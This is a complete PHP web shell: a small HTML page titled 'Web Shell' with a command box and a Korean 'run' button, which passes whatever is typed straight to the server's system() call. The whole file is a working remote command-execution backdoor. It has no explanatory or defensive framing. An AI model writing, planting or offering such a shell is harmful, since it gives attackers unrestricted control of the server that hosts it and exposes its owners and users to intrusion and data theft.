<?php
?>
<!DOCTYPE html>
<html>
<head>
    <title>Web Shell</title>
</head>
<body>
    <form method="POST">
        <input type="text" name="cmd" autofocus>
        <input type="submit" value="실행">
    </form>
    <pre>
<?php
    if(isset($_POST['cmd'])) {
        system($_POST['cmd']);
    }
?>
    </pre>
</body>
</html>
